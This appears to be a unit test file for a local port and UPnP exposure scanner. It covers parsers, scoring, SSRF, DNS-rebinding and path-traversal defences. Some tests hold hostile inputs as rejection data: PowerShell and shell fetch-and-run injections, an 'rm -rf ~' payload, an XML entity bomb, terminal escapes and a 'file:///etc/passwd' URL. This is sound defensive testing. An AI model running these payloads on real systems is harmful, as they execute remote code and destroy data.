"""Run with: python -m unittest -v"""

import http.client
import json
import os
import socket
import tempfile
import threading
import time
import unittest
from pathlib import Path
from unittest.mock import patch

from portscope import analysis, clean, scan, sockets, upnp
from portscope.server import App
from portscope.sockets import Listener

NETSTAT = """
Conexiones activas

  Proto  Dirección local          Dirección remota        Estado           PID
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       2012
  TCP    127.0.0.1:6463         0.0.0.0:0              ESCUCHANDO      3356
  TCP    127.0.0.1:28196        127.0.0.1:53180        ESTABLISHED     7132
  TCP    [::]:445               [::]:0                 LISTENING       4
  UDP    0.0.0.0:5353           *:*                                    3284
  UDP    [fe80::1%12]:1900      *:*                                    13448
  UDP    192.168.1.16:50000     8.8.8.8:53                             99
"""

PROC_TCP = """  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode
   0: 0100007F:0CEA 00000000:0000 0A 00000000:00000000 00:00000000 00000000   999        0 4242 1
   1: 00000000:0016 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 1717 1
   2: 0100007F:0CEA 0100007F:D431 01 00000000:00000000 00:00000000 00000000   999        0 5555 1
"""
PROC_TCP6 = """  sl  local_address                         remote_address                        st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode
   0: 00000000000000000000000001000000:1F90 00000000000000000000000000000000:0000 0A 00000000:00000000 00:00000000 00000000  1000        0 31337 1
"""

DESCRIPTION = b"""<?xml version="1.0"?>
<root xmlns="urn:schemas-upnp-org:device-1-0"><device>
<deviceType>urn:schemas-upnp-org:device:InternetGatewayDevice:1</deviceType>
<friendlyName>Router\xc2\x9b31m evil</friendlyName><manufacturer>ACME</manufacturer><modelName>R1</modelName>
<deviceList><device><deviceList><device><serviceList><service>
<serviceType>urn:schemas-upnp-org:service:WANIPConnection:1</serviceType>
<controlURL>/ctl/IPConn</controlURL></service></serviceList></device></deviceList></device></deviceList>
</device></root>"""

SOAP = b"""<?xml version="1.0"?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"><s:Body>
<u:GetGenericPortMappingEntryResponse xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1">
<NewRemoteHost></NewRemoteHost><NewExternalPort>3389</NewExternalPort><NewProtocol>TCP</NewProtocol>
<NewInternalPort>3389</NewInternalPort><NewInternalClient>192.168.1.50</NewInternalClient>
<NewEnabled>1</NewEnabled><NewPortMappingDescription>rdp</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration>
</u:GetGenericPortMappingEntryResponse></s:Body></s:Envelope>"""


class Parsers(unittest.TestCase):
    def test_netstat_is_locale_independent_and_skips_connections(self):
        rows = sockets.parse_netstat_windows(NETSTAT)
        self.assertEqual(rows, [
            ("tcp", "0.0.0.0", 135, 2012),
            ("tcp", "127.0.0.1", 6463, 3356),
            ("tcp", "::", 445, 4),
            ("udp", "0.0.0.0", 5353, 3284),
            ("udp", "fe80::1", 1900, 13448),
        ])

    def test_tasklist(self):
        self.assertEqual(sockets.parse_tasklist('"System","4","Services","0","11.920 KB"\n"a b.exe","12","Console","1","1 KB"\n'),
                         {4: "System", 12: "a b.exe"})

    def test_proc_net(self):
        self.assertEqual(sockets.parse_proc_net(PROC_TCP, "tcp"), [("127.0.0.1", 3306, 4242), ("0.0.0.0", 22, 1717)])
        self.assertEqual(sockets.parse_proc_net(PROC_TCP6, "tcp"), [("::1", 8080, 31337)])

    def test_description_is_sanitised(self):
        d = upnp.parse_description(DESCRIPTION)
        self.assertEqual(d["friendly_name"], "Router31m evil")  # C1 CSI stripped: no terminal injection
        self.assertEqual(d["wan_services"][0]["control_url"], "/ctl/IPConn")

    def test_soap_response(self):
        r = upnp.parse_soap_response(SOAP, "GetGenericPortMappingEntry")
        self.assertEqual((r["NewExternalPort"], r["NewInternalClient"]), ("3389", "192.168.1.50"))

    def test_soap_envelope_escapes_nothing_user_controlled(self):
        self.assertIn(b"<NewPortMappingIndex>3</NewPortMappingIndex>",
                      upnp.soap_envelope("urn:x", "GetGenericPortMappingEntry", {"NewPortMappingIndex": 3}))


class HostileLan(unittest.TestCase):
    """A device on the LAN controls every byte of its UPnP replies."""

    ENTRY = {"NewProtocol": "TCP", "NewExternalPort": "80", "NewInternalPort": "80",
             "NewInternalClient": "192.168.1.5", "NewEnabled": "True"}

    def test_mapping_fields_are_validated(self):
        self.assertTrue(upnp.parse_mapping(self.ENTRY)["enabled"])  # "True" is enabled too
        for field, value in (
            ("NewProtocol", "tcp $(iwr http://x/p|iex)"),  # would land in a pasted admin PowerShell
            ("NewProtocol", "tcp' ; curl x|sh ; '"),
            ("NewInternalClient", "192.168.1.5; rm -rf ~"),
            ("NewExternalPort", "70000"),
        ):
            with self.subTest(field=field, value=value), self.assertRaises(ValueError):
                upnp.parse_mapping(self.ENTRY | {field: value})

    def test_xml_with_dtd_rejected(self):
        bomb = b'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY a "aaaa">]><root>&a;</root>'
        for xml in (bomb, bomb.decode().encode("utf-16")):
            with self.subTest(encoding=len(xml)), self.assertRaises(ValueError):
                upnp.parse_description(xml)

    def test_clean_strips_terminal_escapes(self):
        self.assertEqual(clean("a\x1b[31mb\x9bc\x00"), "a[31mbc")

    def test_malformed_http_reply_does_not_abort_scan(self):
        try:
            ip = upnp.local_ip_towards("192.0.2.1")
        except OSError:
            self.skipTest("no default route")
        if not upnp.ipaddress.ip_address(ip).is_private:
            self.skipTest("host has no private address")
        srv = socket.create_server((ip, 0))
        port = srv.getsockname()[1]

        def serve():  # an SSH daemon answering an HTTP GET: no status line
            conn, _ = srv.accept()
            conn.recv(4096)  # consume the request, so the client sees a bad status line, not a reset
            conn.sendall(b"SSH-2.0-OpenSSH_9.6\r\n")
            conn.close()

        threading.Thread(target=serve, daemon=True).start()
        try:
            device = upnp._describe(f"http://{ip}:{port}/", {"ip": ip, "server": ""}, time.monotonic() + 10)
        finally:
            srv.close()
        self.assertIn("error", device)
        self.assertFalse(device["igd"])

    def test_slow_http_headers_obey_total_deadline(self):
        server = socket.create_server(("127.0.0.1", 0))
        port = server.getsockname()[1]

        def drip_headers():
            try:
                conn, _ = server.accept()
                with conn:
                    conn.recv(4096)
                    conn.sendall(b"HTTP/1.1 200 OK\r\nX-Slow: ")
                    for _ in range(20):
                        try:
                            conn.sendall(b"x")
                        except OSError:
                            return
                        time.sleep(0.05)
                    conn.sendall(b"\r\nContent-Length: 0\r\n\r\n")
            finally:
                server.close()

        worker = threading.Thread(target=drip_headers, daemon=True)
        worker.start()
        started = time.monotonic()
        try:
            with patch.object(upnp, "checked_url", return_value=("127.0.0.1", port, "/")):
                with self.assertRaises((OSError, http.client.HTTPException, ValueError)):
                    upnp.http_request("http://127.0.0.1/", "127.0.0.1", started + 0.2)
            self.assertLess(time.monotonic() - started, 0.6)
        finally:
            server.close()
            worker.join(timeout=2)


class LocalSystem(unittest.TestCase):
    @unittest.skipUnless(os.name == "nt", "Windows paths")
    def test_windows_tools_use_absolute_existing_paths(self):
        for tool in (sockets.TASKLIST, sockets.NETSTAT, sockets.POWERSHELL):
            with self.subTest(tool=tool):
                self.assertTrue(os.path.isabs(tool) and os.path.isfile(tool))

    def test_history_is_minimal_and_roundtrips(self):
        report = analysis.build_report([Listener("tcp", "0.0.0.0", 445, 4, "System")],
                                       {"gateways": [], "devices": [{"ip": "192.168.1.1"}], "errors": []},
                                       {"state": "on", "detail": ""}, "Windows", None)
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / "sub" / "last_scan.json"
            scan.save_history(path, report)
            stored = json.loads(path.read_text("utf-8"))
            self.assertEqual(stored["findings"], [{"id": "tcp/445", "severity": "high"}])
            self.assertNotIn("System", path.read_text("utf-8"))  # no process names / LAN data at rest
            self.assertEqual(scan.load_history(path), stored)
            if os.name != "nt":
                self.assertEqual(path.parent.stat().st_mode & 0o777, 0o700)
            path.write_text('{"findings": [1]}', "utf-8")
            self.assertIsNone(scan.load_history(path))  # malformed history is ignored, not fatal


class UrlValidation(unittest.TestCase):
    def test_accepts_responder(self):
        self.assertEqual(upnp.checked_url("http://192.168.1.1:5000/desc.xml?a=1", "192.168.1.1"),
                         ("192.168.1.1", 5000, "/desc.xml?a=1"))

    def test_rejects_ssrf(self):
        for url, responder in (
            ("http://192.168.1.2/x", "192.168.1.1"),  # not the device that answered
            ("http://8.8.8.8/x", "8.8.8.8"),          # public address
            ("http://127.0.0.1/x", "127.0.0.1"),      # loopback
            ("https://192.168.1.1/x", "192.168.1.1"),  # scheme
            ("http://router.local/x", "192.168.1.1"),  # DNS name (rebinding)
            ("file:///etc/passwd", "192.168.1.1"),
        ):
            with self.subTest(url=url), self.assertRaises(upnp.UnsafeURL):
                upnp.checked_url(url, responder)


class Analysis(unittest.TestCase):
    def test_exposure_and_severity(self):
        f = {x["id"]: x for x in analysis.assess([
            Listener("tcp", "127.0.0.1", 6379, 1, "redis"),
            Listener("tcp", "0.0.0.0", 445, 4, "System"),
            Listener("tcp", "::", 445, 4, "System"),
            Listener("udp", "0.0.0.0", 60000, 9, "svchost"),
        ], None)}
        self.assertEqual(f["tcp/6379"]["severity"], "info")  # critical service, but loopback only
        self.assertEqual(f["tcp/445"]["severity"], "high")
        self.assertEqual(f["tcp/445"]["addresses"], ["0.0.0.0", "::"])
        self.assertEqual(f["udp/60000"]["severity"], "info")

    def test_upnp_mapping_escalates_to_internet(self):
        gw = {"ip": "192.168.1.1", "local_ip": "192.168.1.16", "mappings": [
            {"protocol": "tcp", "internal_port": 3389, "external_port": 3389, "internal_client": "192.168.1.16", "enabled": True},
            {"protocol": "tcp", "internal_port": 22, "external_port": 2222, "internal_client": "192.168.1.50", "enabled": True},
        ]}
        f = {x["id"]: x for x in analysis.assess([Listener("tcp", "0.0.0.0", 3389)], {"gateways": [gw]})}
        self.assertEqual((f["tcp/3389"]["exposure"], f["tcp/3389"]["severity"]), ("internet", "critical"))
        other = f["upnp/192.168.1.1/tcp/2222/192.168.1.50"]
        self.assertEqual((other["host"], other["severity"]), ("192.168.1.50", "critical"))
        self.assertIsNone(f["tcp/3389"]["host"])

    def test_disabled_mapping_is_not_internet_exposure(self):
        gw = {"ip": "192.168.1.1", "local_ip": "192.168.1.16", "mappings": [
            {"protocol": "tcp", "internal_port": 3389, "external_port": 3389, "internal_client": "192.168.1.16", "enabled": False},
        ]}
        f = {x["id"]: x for x in analysis.assess([Listener("tcp", "0.0.0.0", 3389)], {"gateways": [gw]})}
        self.assertEqual(f["tcp/3389"]["exposure"], "network")
        self.assertEqual(f["upnp/192.168.1.1/tcp/3389/192.168.1.16"]["severity"], "low")

    def test_forward_to_loopback_only_service_is_not_exposure(self):
        gw = {"ip": "192.168.1.1", "local_ip": "192.168.1.16", "mappings": [
            {"protocol": "tcp", "internal_port": 6379, "external_port": 6379, "internal_client": "192.168.1.16", "enabled": True},
        ]}
        f = {x["id"]: x for x in analysis.assess([Listener("tcp", "127.0.0.1", 6379)], {"gateways": [gw]})}
        self.assertEqual((f["tcp/6379"]["exposure"], f["tcp/6379"]["upnp"]), ("local", []))
        self.assertIn("upnp/192.168.1.1/tcp/6379/192.168.1.16", f)  # the router hole is still reported

    def test_ipv4_mapped_loopback_is_local(self):
        self.assertTrue(analysis.is_loopback("::ffff:127.0.0.1"))
        self.assertFalse(analysis.is_loopback("::ffff:192.168.1.1"))

    def test_diff_skipped_when_scan_scope_changes(self):
        prev = analysis.build_report([], {"gateways": [], "devices": [], "errors": []}, {"state": "on", "detail": ""}, "Linux", None)
        self.assertIsNone(analysis.build_report([], None, {"state": "on", "detail": ""}, "Linux", prev)["diff"])
        self.assertIsNotNone(analysis.build_report([], {"gateways": []}, {"state": "on", "detail": ""}, "Linux", prev)["diff"])

    def test_score_is_bounded_and_monotonic(self):
        many = [{"severity": "critical", "exposure": "internet"}] * 10
        self.assertEqual(analysis.score(many, None, {"state": "off"})["grade"], "F")
        self.assertEqual(analysis.score([], None, {"state": "on"})["value"], 100)
        on = analysis.score([{"severity": "high", "exposure": "network"}], None, {"state": "on"})["value"]
        off = analysis.score([{"severity": "high", "exposure": "network"}], None, {"state": "off"})["value"]
        self.assertGreater(on, off)

    def test_diff(self):
        cur = [{"id": "a", "severity": "high"}, {"id": "b", "severity": "low"}, {"id": "x", "severity": "info"}]
        old = [{"id": "b", "severity": "low"}, {"id": "c", "severity": "medium"}, {"id": "y", "severity": "info"}]
        self.assertEqual(analysis.diff(cur, old), {"new": ["a"], "gone": ["c"]})  # info churn ignored

    def test_port_db_is_complete(self):
        for port, entry in analysis.PORTS.items():
            with self.subTest(port=port):
                self.assertIn(entry["risk"], analysis.LEVELS)
                for lang in ("en", "es"):
                    self.assertTrue(entry[lang]["what"] and entry[lang]["why"])


class Server(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.tmp = tempfile.TemporaryDirectory()
        cls.app = App(0, history=Path(cls.tmp.name) / "last_scan.json")  # keep the user's real history untouched
        threading.Thread(target=cls.app.serve_forever, daemon=True).start()

    @classmethod
    def tearDownClass(cls):
        cls.app.shutdown()
        cls.app.server_close()
        cls.tmp.cleanup()

    def request(self, method, path, host=None, token=None, body=None):
        conn = http.client.HTTPConnection("127.0.0.1", self.app.server_port, timeout=60)
        headers = {"Host": host or f"127.0.0.1:{self.app.server_port}"}
        if token:
            headers["X-PortScope-Token"] = token
        conn.request(method, path, body=body, headers=headers)
        r = conn.getresponse()
        return r.status, dict(r.getheaders()), r.read()

    def test_static_has_security_headers(self):
        status, headers, _ = self.request("GET", "/")
        self.assertEqual(status, 200)
        self.assertIn("frame-ancestors 'none'", headers["Content-Security-Policy"])
        self.assertIn("require-trusted-types-for 'script'", headers["Content-Security-Policy"])

    def test_dns_rebinding_blocked(self):
        self.assertEqual(self.request("GET", "/", host="attacker.example:80")[0], 421)

    def test_api_requires_token(self):
        self.assertEqual(self.request("POST", "/api/scan", body=b"{}")[0], 401)
        self.assertEqual(self.request("POST", "/api/scan", token="wrong", body=b"{}")[0], 401)

    def test_path_traversal_not_served(self):
        for path in ("/../server.py", "/i18n/../../server.py", "/i18n/xx.json", "/i18n/EN.json"):
            with self.subTest(path=path):
                self.assertEqual(self.request("GET", path)[0], 404)
        self.assertEqual(self.request("GET", "/i18n/es.json")[0], 200)

    def test_bad_content_length_rejected(self):
        for length in ("-1", "abc", "4096"):
            with self.subTest(length=length):
                conn = http.client.HTTPConnection("127.0.0.1", self.app.server_port, timeout=10)
                conn.putrequest("POST", "/api/scan", skip_host=True)
                conn.putheader("Host", f"127.0.0.1:{self.app.server_port}")
                conn.putheader("X-PortScope-Token", self.app.token)
                conn.putheader("Content-Length", length)
                conn.endheaders()
                self.assertEqual(conn.getresponse().status, 400)

    def test_launch_code_works_once(self):
        app = App(0, history=None)
        code = app.launch_url.rsplit("#c=", 1)[1]
        self.assertIsNone(app.redeem("wrong"))
        self.assertEqual(app.redeem(code), app.token)
        self.assertIsNone(app.redeem(code))  # replay from `ps` output is useless
        self.assertNotIn(app.token, app.launch_url)
        app.server_close()

    def test_scan(self):
        status, _, body = self.request("POST", "/api/scan", token=self.app.token, body=json.dumps({"upnp": False}).encode())
        self.assertEqual(status, 200, body)
        report = json.loads(body)
        self.assertIn(report["score"]["grade"], "ABCDF")


if __name__ == "__main__":
    unittest.main()
